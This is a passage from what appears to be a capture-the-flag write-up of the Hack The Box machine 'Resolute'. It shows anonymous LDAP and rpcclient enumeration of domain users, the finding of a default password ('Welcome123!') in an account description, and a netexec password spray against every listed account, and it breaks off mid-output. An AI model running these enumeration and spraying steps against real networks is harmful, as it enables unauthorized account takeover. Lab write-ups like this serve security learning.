+distinguishedName: CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSet
+name: DC
+-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
+distinguishedName: CN=DFSR-LocalSettings,CN=RESOLUTE,OU=Domain Controllers,DC=
+name: DFSR-LocalSettings
+distinguishedName: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=RESOLUTE,O
+name: Domain System Volume
+distinguishedName: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Loca
+name: SYSVOL Subscription
+distinguishedName: OU=Service-Accounts,DC=megabank,DC=local
+name: Service-Accounts
+distinguishedName: OU=Groups,DC=megabank,DC=local
+name: Groups
+distinguishedName: CN=Contractors,OU=Groups,DC=megabank,DC=local
+displayName: Contractors
+name: Contractors
+sAMAccountName: Contractors
+distinguishedName: CN=MS02,CN=Computers,DC=megabank,DC=local
+name: MS02
+badPwdCount: 0
+pwdLastSet: 132140540358467981
+sAMAccountName: MS02$
+dNSHostName: MS02.megabank.local
+servicePrincipalName: RestrictedKrbHost/MS02
+servicePrincipalName: HOST/MS02
+servicePrincipalName: RestrictedKrbHost/MS02.megabank.local
+servicePrincipalName: HOST/MS02.megabank.local
+distinguishedName: CN=BCKUPKEY_35534c7b-54ea-4e03-8d0a-8e79f58db08a Secret,CN=
+name: BCKUPKEY_35534c7b-54ea-4e03-8d0a-8e79f58db08a Secret
+distinguishedName: CN=BCKUPKEY_P Secret,CN=System,DC=megabank,DC=local
+name: BCKUPKEY_P Secret
+distinguishedName: CN=BCKUPKEY_16defc52-8527-4d64-9dd7-4c4fd9fb477a Secret,CN=
+name: BCKUPKEY_16defc52-8527-4d64-9dd7-4c4fd9fb477a Secret
+distinguishedName: CN=BCKUPKEY_PREFERRED Secret,CN=System,DC=megabank,DC=local
+name: BCKUPKEY_PREFERRED Secret
+distinguishedName: CN=S-1-5-7,CN=ForeignSecurityPrincipals,DC=megabank,DC=loca
+name: S-1-5-7
+distinguishedName: CN=S-1-1-0,CN=ForeignSecurityPrincipals,DC=megabank,DC=loca
+name: S-1-1-0
+distinguishedName: OU=MegaBank Users,DC=megabank,DC=local
+name: MegaBank Users
+distinguishedName: OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
+name: Employees
+distinguishedName: OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
+name: Contractors
+givenName: Ryan
+distinguishedName: CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megaba
+displayName: Ryan Bertrand
+name: Ryan Bertrand
+badPwdCount: 0
+pwdLastSet: 133829889021792274
+sAMAccountName: ryan
+userPrincipalName: ryan@megabank.local
+givenName: Marko
+distinguishedName: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,D
+displayName: Marko Novak
+name: Marko Novak
+badPwdCount: 0
+pwdLastSet: 132140638345690606
+sAMAccountName: marko
+userPrincipalName: marko@megabank.local
+distinguishedName: CN=Sunita Rahman,CN=Users,DC=megabank,DC=local
+name: Sunita Rahman
+badPwdCount: 0
+pwdLastSet: 132198819891083273
+sAMAccountName: sunita
+userPrincipalName: sunita@megabank.local
+distinguishedName: CN=Abigail Jeffers,CN=Users,DC=megabank,DC=local
+name: Abigail Jeffers
+badPwdCount: 0
+pwdLastSet: 132198820509369461
+sAMAccountName: abigail
+userPrincipalName: abigail@megabank.local
+distinguishedName: CN=Marcus Strong,CN=Users,DC=megabank,DC=local
+name: Marcus Strong
+badPwdCount: 0
+pwdLastSet: 132198820792562716
+sAMAccountName: marcus
+userPrincipalName: marcus@megabank.local
+distinguishedName: CN=Sally May,CN=Users,DC=megabank,DC=local
+name: Sally May
+badPwdCount: 0
+pwdLastSet: 132198821096226153
+sAMAccountName: sally
+userPrincipalName: sally@megabank.local
+distinguishedName: CN=Fred Carr,CN=Users,DC=megabank,DC=local
+name: Fred Carr
+badPwdCount: 0
+pwdLastSet: 132198821418824420
+sAMAccountName: fred
+userPrincipalName: fred@megabank.local
+distinguishedName: CN=Angela Perkins,CN=Users,DC=megabank,DC=local
+name: Angela Perkins
+badPwdCount: 0
+pwdLastSet: 132198821834511483
+sAMAccountName: angela
+userPrincipalName: angela@megabank.local
+distinguishedName: CN=Felicia Carter,CN=Users,DC=megabank,DC=local
+name: Felicia Carter
+badPwdCount: 0
+pwdLastSet: 132198822535452218
+sAMAccountName: felicia
+userPrincipalName: felicia@megabank.local
+distinguishedName: CN=Gustavo Pallieros,CN=Users,DC=megabank,DC=local
+name: Gustavo Pallieros
+badPwdCount: 0
+pwdLastSet: 132198823020825669
+sAMAccountName: gustavo
+userPrincipalName: gustavo@megabank.local
+distinguishedName: CN=Ulf Berg,CN=Users,DC=megabank,DC=local
+name: Ulf Berg
+badPwdCount: 0
+pwdLastSet: 132198823399575646
+sAMAccountName: ulf
+userPrincipalName: ulf@megabank.local
+distinguishedName: CN=Stevie Gerrard,CN=Users,DC=megabank,DC=local
+name: Stevie Gerrard
+badPwdCount: 0
+pwdLastSet: 132198823934381342
+sAMAccountName: stevie
+userPrincipalName: stevie@megabank.local
+distinguishedName: CN=Claire Norman,CN=Users,DC=megabank,DC=local
+name: Claire Norman
+badPwdCount: 0
+pwdLastSet: 132198824248084501
+sAMAccountName: claire
+userPrincipalName: claire@megabank.local
+distinguishedName: CN=Paulo Alcobia,CN=Users,DC=megabank,DC=local
+name: Paulo Alcobia
+badPwdCount: 0
+pwdLastSet: 132198824867454267
+sAMAccountName: paulo
+userPrincipalName: paulo@megabank.local
+distinguishedName: CN=Steve Rider,CN=Users,DC=megabank,DC=local
+name: Steve Rider
+badPwdCount: 0
+pwdLastSet: 132198825251259172
+sAMAccountName: steve
+userPrincipalName: steve@megabank.local
+distinguishedName: CN=Annette Nilsson,CN=Users,DC=megabank,DC=local
+name: Annette Nilsson
+badPwdCount: 0
+pwdLastSet: 132198826155923580
+sAMAccountName: annette
+userPrincipalName: annette@megabank.local
+distinguishedName: CN=Annika Larson,CN=Users,DC=megabank,DC=local
+name: Annika Larson
+badPwdCount: 0
+pwdLastSet: 132198826436663777
+sAMAccountName: annika
+userPrincipalName: annika@megabank.local
+distinguishedName: CN=Per Olsson,CN=Users,DC=megabank,DC=local
+name: Per Olsson
+badPwdCount: 0
+pwdLastSet: 132198826922786729
+sAMAccountName: per
+userPrincipalName: per@megabank.local
+distinguishedName: CN=Claude Segal,CN=Users,DC=megabank,DC=local
+name: Claude Segal
+badPwdCount: 0
+pwdLastSet: 132198827964076214
+sAMAccountName: claude
+userPrincipalName: claude@megabank.local
+distinguishedName: CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
+name: Melanie Purkis
+badPwdCount: 0
+pwdLastSet: 133829889028355454
+sAMAccountName: melanie
+userPrincipalName: melanie@megabank.local
+distinguishedName: CN=Zach Armstrong,CN=Users,DC=megabank,DC=local
+name: Zach Armstrong
+badPwdCount: 0
+pwdLastSet: 132199295678350932
+sAMAccountName: zach
+userPrincipalName: zach@megabank.local
+distinguishedName: CN=Simon Faraday,CN=Users,DC=megabank,DC=local
+name: Simon Faraday
+badPwdCount: 0
+pwdLastSet: 132199295985634433
+sAMAccountName: simon
+userPrincipalName: simon@megabank.local
+distinguishedName: CN=Naoki Yamamoto,CN=Users,DC=megabank,DC=local
+name: Naoki Yamamoto
+badPwdCount: 0
+pwdLastSet: 132199296443424853
+sAMAccountName: naoki
+userPrincipalName: naoki@megabank.local
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8026-b7b0-c97869b84890" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ ldapsearch -x -H ldap://10.10.10.169 -b &quot;cn=Users,dc=megabank,dc=local&quot; | grep -iE &quot;name|userPrincipalName|pwd&quot;
+distinguishedName: CN=Users,DC=megabank,DC=local
+name: Users
+distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=mega
+name: Allowed RODC Password Replication Group
+sAMAccountName: Allowed RODC Password Replication Group
+distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=megab
+name: Denied RODC Password Replication Group
+sAMAccountName: Denied RODC Password Replication Group
+distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=mega
+name: Enterprise Read-only Domain Controllers
+sAMAccountName: Enterprise Read-only Domain Controllers
+distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=megabank,DC=loc
+name: Cloneable Domain Controllers
+sAMAccountName: Cloneable Domain Controllers
+distinguishedName: CN=Protected Users,CN=Users,DC=megabank,DC=local
+name: Protected Users
+sAMAccountName: Protected Users
+distinguishedName: CN=Key Admins,CN=Users,DC=megabank,DC=local
+name: Key Admins
+sAMAccountName: Key Admins
+distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=megabank,DC=local
+name: Enterprise Key Admins
+sAMAccountName: Enterprise Key Admins
+distinguishedName: CN=DnsAdmins,CN=Users,DC=megabank,DC=local
+name: DnsAdmins
+sAMAccountName: DnsAdmins
+distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=megabank,DC=local
+name: DnsUpdateProxy
+sAMAccountName: DnsUpdateProxy
+distinguishedName: CN=Sunita Rahman,CN=Users,DC=megabank,DC=local
+name: Sunita Rahman
+badPwdCount: 0
+pwdLastSet: 132198819891083273
+sAMAccountName: sunita
+userPrincipalName: sunita@megabank.local
+distinguishedName: CN=Abigail Jeffers,CN=Users,DC=megabank,DC=local
+name: Abigail Jeffers
+badPwdCount: 0
+pwdLastSet: 132198820509369461
+sAMAccountName: abigail
+userPrincipalName: abigail@megabank.local
+distinguishedName: CN=Marcus Strong,CN=Users,DC=megabank,DC=local
+name: Marcus Strong
+badPwdCount: 0
+pwdLastSet: 132198820792562716
+sAMAccountName: marcus
+userPrincipalName: marcus@megabank.local
+distinguishedName: CN=Sally May,CN=Users,DC=megabank,DC=local
+name: Sally May
+badPwdCount: 0
+pwdLastSet: 132198821096226153
+sAMAccountName: sally
+userPrincipalName: sally@megabank.local
+distinguishedName: CN=Fred Carr,CN=Users,DC=megabank,DC=local
+name: Fred Carr
+badPwdCount: 0
+pwdLastSet: 132198821418824420
+sAMAccountName: fred
+userPrincipalName: fred@megabank.local
+distinguishedName: CN=Angela Perkins,CN=Users,DC=megabank,DC=local
+name: Angela Perkins
+badPwdCount: 0
+pwdLastSet: 132198821834511483
+sAMAccountName: angela
+userPrincipalName: angela@megabank.local
+distinguishedName: CN=Felicia Carter,CN=Users,DC=megabank,DC=local
+name: Felicia Carter
+badPwdCount: 0
+pwdLastSet: 132198822535452218
+sAMAccountName: felicia
+userPrincipalName: felicia@megabank.local
+distinguishedName: CN=Gustavo Pallieros,CN=Users,DC=megabank,DC=local
+name: Gustavo Pallieros
+badPwdCount: 0
+pwdLastSet: 132198823020825669
+sAMAccountName: gustavo
+userPrincipalName: gustavo@megabank.local
+distinguishedName: CN=Ulf Berg,CN=Users,DC=megabank,DC=local
+name: Ulf Berg
+badPwdCount: 0
+pwdLastSet: 132198823399575646
+sAMAccountName: ulf
+userPrincipalName: ulf@megabank.local
+distinguishedName: CN=Stevie Gerrard,CN=Users,DC=megabank,DC=local
+name: Stevie Gerrard
+badPwdCount: 0
+pwdLastSet: 132198823934381342
+sAMAccountName: stevie
+userPrincipalName: stevie@megabank.local
+distinguishedName: CN=Claire Norman,CN=Users,DC=megabank,DC=local
+name: Claire Norman
+badPwdCount: 0
+pwdLastSet: 132198824248084501
+sAMAccountName: claire
+userPrincipalName: claire@megabank.local
+distinguishedName: CN=Paulo Alcobia,CN=Users,DC=megabank,DC=local
+name: Paulo Alcobia
+badPwdCount: 0
+pwdLastSet: 132198824867454267
+sAMAccountName: paulo
+userPrincipalName: paulo@megabank.local
+distinguishedName: CN=Steve Rider,CN=Users,DC=megabank,DC=local
+name: Steve Rider
+badPwdCount: 0
+pwdLastSet: 132198825251259172
+sAMAccountName: steve
+userPrincipalName: steve@megabank.local
+distinguishedName: CN=Annette Nilsson,CN=Users,DC=megabank,DC=local
+name: Annette Nilsson
+badPwdCount: 0
+pwdLastSet: 132198826155923580
+sAMAccountName: annette
+userPrincipalName: annette@megabank.local
+distinguishedName: CN=Guest,CN=Users,DC=megabank,DC=local
+name: Guest
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: Guest
+distinguishedName: CN=Annika Larson,CN=Users,DC=megabank,DC=local
+name: Annika Larson
+badPwdCount: 0
+pwdLastSet: 132198826436663777
+sAMAccountName: annika
+userPrincipalName: annika@megabank.local
+distinguishedName: CN=DefaultAccount,CN=Users,DC=megabank,DC=local
+name: DefaultAccount
+badPwdCount: 0
+pwdLastSet: 0
+sAMAccountName: DefaultAccount
+distinguishedName: CN=Per Olsson,CN=Users,DC=megabank,DC=local
+name: Per Olsson
+badPwdCount: 0
+pwdLastSet: 132198826922786729
+sAMAccountName: per
+userPrincipalName: per@megabank.local
+distinguishedName: CN=Claude Segal,CN=Users,DC=megabank,DC=local
+name: Claude Segal
+badPwdCount: 0
+pwdLastSet: 132198827964076214
+sAMAccountName: claude
+userPrincipalName: claude@megabank.local
+distinguishedName: CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
+name: Melanie Purkis
+badPwdCount: 0
+pwdLastSet: 133829898027594155
+sAMAccountName: melanie
+userPrincipalName: melanie@megabank.local
+distinguishedName: CN=Zach Armstrong,CN=Users,DC=megabank,DC=local
+name: Zach Armstrong
+badPwdCount: 0
+pwdLastSet: 132199295678350932
+sAMAccountName: zach
+userPrincipalName: zach@megabank.local
+distinguishedName: CN=Simon Faraday,CN=Users,DC=megabank,DC=local
+name: Simon Faraday
+badPwdCount: 0
+pwdLastSet: 132199295985634433
+sAMAccountName: simon
+userPrincipalName: simon@megabank.local
+distinguishedName: CN=Naoki Yamamoto,CN=Users,DC=megabank,DC=local
+name: Naoki Yamamoto
+badPwdCount: 0
+pwdLastSet: 132199296443424853
+sAMAccountName: naoki
+userPrincipalName: naoki@megabank.local
+distinguishedName: CN=Domain Computers,CN=Users,DC=megabank,DC=local
+name: Domain Computers
+sAMAccountName: Domain Computers
+distinguishedName: CN=Cert Publishers,CN=Users,DC=megabank,DC=local
+name: Cert Publishers
+sAMAccountName: Cert Publishers
+distinguishedName: CN=Domain Users,CN=Users,DC=megabank,DC=local
+name: Domain Users
+sAMAccountName: Domain Users
+distinguishedName: CN=Domain Guests,CN=Users,DC=megabank,DC=local
+name: Domain Guests
+sAMAccountName: Domain Guests
+distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=loca
+name: Group Policy Creator Owners
+sAMAccountName: Group Policy Creator Owners
+distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=megabank,DC=local
+name: RAS and IAS Servers
+sAMAccountName: RAS and IAS Servers
+</code></pre><h3 id="18ed1b9f-8847-80bf-b3d9-dce1a18feb70" class="">Filtering LDAP results</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8020-a858-d72fc38aa428" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb]
+└─$ ldapsearch -x -H ldap://10.10.10.169 -b &quot;cn=Users,dc=megabank,dc=local&quot; | grep -E &quot;name|sAMAccount|userPrincipalName&quot;
+name: Users
+name: Allowed RODC Password Replication Group
+sAMAccountName: Allowed RODC Password Replication Group
+sAMAccountType: 536870912
+name: Denied RODC Password Replication Group
+sAMAccountName: Denied RODC Password Replication Group
+sAMAccountType: 536870912
+name: Enterprise Read-only Domain Controllers
+sAMAccountName: Enterprise Read-only Domain Controllers
+sAMAccountType: 268435456
+name: Cloneable Domain Controllers
+sAMAccountName: Cloneable Domain Controllers
+sAMAccountType: 268435456
+name: Protected Users
+sAMAccountName: Protected Users
+sAMAccountType: 268435456
+name: Key Admins
+sAMAccountName: Key Admins
+sAMAccountType: 268435456
+name: Enterprise Key Admins
+sAMAccountName: Enterprise Key Admins
+sAMAccountType: 268435456
+name: DnsAdmins
+sAMAccountName: DnsAdmins
+sAMAccountType: 536870912
+name: DnsUpdateProxy
+sAMAccountName: DnsUpdateProxy
+sAMAccountType: 268435456
+name: Sunita Rahman
+sAMAccountName: sunita
+sAMAccountType: 805306368
+userPrincipalName: sunita@megabank.local
+name: Abigail Jeffers
+sAMAccountName: abigail
+sAMAccountType: 805306368
+userPrincipalName: abigail@megabank.local
+name: Marcus Strong
+sAMAccountName: marcus
+sAMAccountType: 805306368
+userPrincipalName: marcus@megabank.local
+name: Sally May
+sAMAccountName: sally
+sAMAccountType: 805306368
+userPrincipalName: sally@megabank.local
+name: Fred Carr
+sAMAccountName: fred
+sAMAccountType: 805306368
+userPrincipalName: fred@megabank.local
+name: Angela Perkins
+sAMAccountName: angela
+sAMAccountType: 805306368
+userPrincipalName: angela@megabank.local
+name: Felicia Carter
+sAMAccountName: felicia
+sAMAccountType: 805306368
+userPrincipalName: felicia@megabank.local
+name: Gustavo Pallieros
+sAMAccountName: gustavo
+sAMAccountType: 805306368
+userPrincipalName: gustavo@megabank.local
+name: Ulf Berg
+sAMAccountName: ulf
+sAMAccountType: 805306368
+userPrincipalName: ulf@megabank.local
+name: Stevie Gerrard
+sAMAccountName: stevie
+sAMAccountType: 805306368
+userPrincipalName: stevie@megabank.local
+name: Claire Norman
+sAMAccountName: claire
+sAMAccountType: 805306368
+userPrincipalName: claire@megabank.local
+name: Paulo Alcobia
+sAMAccountName: paulo
+sAMAccountType: 805306368
+userPrincipalName: paulo@megabank.local
+name: Steve Rider
+sAMAccountName: steve
+sAMAccountType: 805306368
+userPrincipalName: steve@megabank.local
+name: Annette Nilsson
+sAMAccountName: annette
+sAMAccountType: 805306368
+userPrincipalName: annette@megabank.local
+name: Guest
+sAMAccountName: Guest
+sAMAccountType: 805306368
+name: Annika Larson
+sAMAccountName: annika
+sAMAccountType: 805306368
+userPrincipalName: annika@megabank.local
+name: DefaultAccount
+sAMAccountName: DefaultAccount
+sAMAccountType: 805306368
+name: Per Olsson
+sAMAccountName: per
+sAMAccountType: 805306368
+userPrincipalName: per@megabank.local
+name: Claude Segal
+sAMAccountName: claude
+sAMAccountType: 805306368
+userPrincipalName: claude@megabank.local
+name: Melanie Purkis
+sAMAccountName: melanie
+sAMAccountType: 805306368
+userPrincipalName: melanie@megabank.local
+name: Zach Armstrong
+sAMAccountName: zach
+sAMAccountType: 805306368
+userPrincipalName: zach@megabank.local
+name: Simon Faraday
+sAMAccountName: simon
+sAMAccountType: 805306368
+userPrincipalName: simon@megabank.local
+name: Naoki Yamamoto
+sAMAccountName: naoki
+sAMAccountType: 805306368
+userPrincipalName: naoki@megabank.local
+name: Domain Computers
+sAMAccountName: Domain Computers
+sAMAccountType: 268435456
+name: Cert Publishers
+sAMAccountName: Cert Publishers
+sAMAccountType: 536870912
+name: Domain Users
+sAMAccountName: Domain Users
+sAMAccountType: 268435456
+name: Domain Guests
+sAMAccountName: Domain Guests
+sAMAccountType: 268435456
+name: Group Policy Creator Owners
+sAMAccountName: Group Policy Creator Owners
+sAMAccountType: 268435456
+name: RAS and IAS Servers
+sAMAccountName: RAS and IAS Servers
+sAMAccountType: 536870912
+</code></pre><h3 id="18ed1b9f-8847-8020-a827-c754f4100e6e" class="">RPC</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-804c-844b-d2959d4dfe2b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ rpcclient -U &quot;&quot; -N 10.10.10.169
+rpcclient $&gt; rpcclient $&gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-806b-b55b-f59c3b9da442" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">rpcclient $&gt; querydispinfo
+index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
+index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
+index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
+index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
+index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
+index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
+index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
+index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
+index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
+index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
+index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
+index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
+index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
+index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
+index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
+index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
+index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
+index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
+index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
+index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
+index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
+index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)
+</code></pre><h2 id="18ed1b9f-8847-81e8-94ee-ff93adc97b37" class="">Findings</h2><ul id="18ed1b9f-8847-810a-99cd-ed02e604f8c9" class="bulleted-list"><li style="list-style-type:disc">Users</li></ul><ul id="18ed1b9f-8847-80cd-a780-e9851f4b23ca" class="bulleted-list"><li style="list-style-type:disc">New user Marko → default password → Welcome123!</li></ul><h1 id="18ed1b9f-8847-81d7-91cc-ef9eb32a6a51" class="">User</h1><h3 id="18ed1b9f-8847-8070-b54f-db904dfe9469" class="">Marko do not exist, so try to make bruteforce</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ed1b9f-8847-8045-a264-d80f05b877d8" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Resolute]
+└─$ netexec smb 10.10.10.169 -d megabank.local -u users.txt -p &#x27;Welcome123!&#x27; --rid-brute
+SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
